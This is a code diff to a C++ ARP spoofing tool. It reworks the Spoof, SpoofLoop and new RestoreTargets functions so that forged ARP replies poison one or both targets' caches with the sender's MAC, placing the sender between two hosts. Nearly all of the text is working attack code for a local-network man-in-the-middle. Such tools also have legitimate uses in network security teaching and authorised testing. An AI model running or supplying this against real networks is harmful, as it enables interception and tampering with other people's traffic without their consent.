@@ -60,27 +60,47 @@ int ARPSpoof::ARPSpoofer::GetTargetMACAddr(const int socketFd, const char* inter
     return NO_ERROR;
 }
 
-int ARPSpoof::ARPSpoofer::Spoof(const int socketFd, const char* interfaceName, const PacketCraft::ARPPacket& arpPacket)
+int ARPSpoof::ARPSpoofer::Spoof(const int socketFd, const char* interfaceName, const char* yourIP, const char* yourMAC, 
+    const char* target1IPStr, const char* target1MACStr, const char* target2IPStr, const char* target2MACStr, const bool32 spoofBoth)
 {
+    PacketCraft::ARPPacket arpPacket;
+    if(arpPacket.Create(yourMAC, target1MACStr, target2IPStr, target1IPStr, ARPType::ARP_REPLY) == APPLICATION_ERROR)
+    {
+        LOG_ERROR(APPLICATION_ERROR, "ARPPacket::Create() error!");
+        return APPLICATION_ERROR;
+    }
+
     if(arpPacket.Send(socketFd, interfaceName) == APPLICATION_ERROR)
     {
         LOG_ERROR(APPLICATION_ERROR, "ARPPacket::Send() error!");
         return APPLICATION_ERROR;
     }
 
+    std::cout << "sending ARP packet to " << target1MACStr << " (" << target1IPStr << "): " << yourMAC << " is at " << target2IPStr << "\n";
+
+    if(spoofBoth == TRUE)
+    {
+        if(arpPacket.Create(yourMAC, target2MACStr, target1IPStr, target2IPStr, ARPType::ARP_REPLY) == APPLICATION_ERROR)
+        {
+            LOG_ERROR(APPLICATION_ERROR, "ARPPacket::Create() error!");
+            return APPLICATION_ERROR;
+        }
+
+        if(arpPacket.Send(socketFd, interfaceName) == APPLICATION_ERROR)
+        {
+            LOG_ERROR(APPLICATION_ERROR, "ARPPacket::Send() error!");
+            return APPLICATION_ERROR;
+        }
+
+        std::cout << "sending ARP packet to " << target2MACStr << " (" << target2IPStr << "): " << yourMAC << " is at " << target1IPStr << "\n";
+    }
+
     return NO_ERROR;
 }
 
-int ARPSpoof::ARPSpoofer::SpoofLoop(const int socketFd, const char* interfaceName, const char* srcMAC, const char* dstMAC, const char* srcIP, 
-    const char* dstIP)
+int ARPSpoof::ARPSpoofer::SpoofLoop(const int socketFd, const char* interfaceName, const char* yourIP, const char* yourMAC, 
+    const char* target1IPStr, const char* target1MACStr, const char* target2IPStr, const char* target2MACStr, const bool32 spoofBoth)
 {
-    PacketCraft::ARPPacket arpPacket;
-    if(arpPacket.Create(srcMAC, dstMAC, srcIP, dstIP, ARPType::ARP_REPLY) == APPLICATION_ERROR)
-    {
-        LOG_ERROR(APPLICATION_ERROR, "ARPPacket::Create() error!");
-        return APPLICATION_ERROR;
-    }
-
     pollfd pollFds[1]{};
     pollFds[0].fd = 0;      
     pollFds[0].events = POLLIN;
@@ -97,14 +117,10 @@ int ARPSpoof::ARPSpoofer::SpoofLoop(const int socketFd, const char* interfaceNam
         }
         else if(nEvents == 0)
         {
-            if(Spoof(socketFd, interfaceName, arpPacket) == APPLICATION_ERROR)
+            if(Spoof(socketFd, interfaceName, yourIP, yourMAC, target1IPStr, target1MACStr, target2IPStr, target2MACStr, spoofBoth) == APPLICATION_ERROR)
             {
                 LOG_ERROR(APPLICATION_ERROR, "Spoof() error!");
                 return APPLICATION_ERROR;
-            }
-            else
-            {
-                std::cout << "Sending ARP packet: " << srcMAC << " is at " << srcIP << "\n";
             }
         }
         else
@@ -114,6 +130,40 @@ int ARPSpoof::ARPSpoofer::SpoofLoop(const int socketFd, const char* interfaceNam
                 std::cout << "stopping..." << std::endl;
                 break;
             }
+        }
+    }
+
+    return NO_ERROR;
+}
+
+int ARPSpoof::ARPSpoofer::RestoreTargets(const int socketFd, const char* interfaceName, const char* yourIP, const char* yourMAC, 
+    const char* target1IPStr, const char* target1MACStr, const char* target2IPStr, const char* target2MACStr, const bool32 spoofBoth)
+{
+    PacketCraft::ARPPacket arpPacket;
+    if(arpPacket.Create(target2MACStr, target1MACStr, target2IPStr, target1IPStr, ARPType::ARP_REPLY) == APPLICATION_ERROR)
+    {
+        LOG_ERROR(APPLICATION_ERROR, "ARPPacket::Create() error!");
+        return APPLICATION_ERROR;
+    }
+
+    if(arpPacket.Send(socketFd, interfaceName) == APPLICATION_ERROR)
+    {
+        LOG_ERROR(APPLICATION_ERROR, "ARPPacket::Send() error!");
+        return APPLICATION_ERROR;
+    }
+
+    if(spoofBoth == TRUE)
+    {
+        if(arpPacket.Create(target1MACStr, target2MACStr, target1IPStr, target2IPStr, ARPType::ARP_REPLY) == APPLICATION_ERROR)
+        {
+            LOG_ERROR(APPLICATION_ERROR, "ARPPacket::Create() error!");
+            return APPLICATION_ERROR;
+        }
+
+        if(arpPacket.Send(socketFd, interfaceName) == APPLICATION_ERROR)
+        {
+            LOG_ERROR(APPLICATION_ERROR, "ARPPacket::Send() error!");
+            return APPLICATION_ERROR;
         }
     }
 
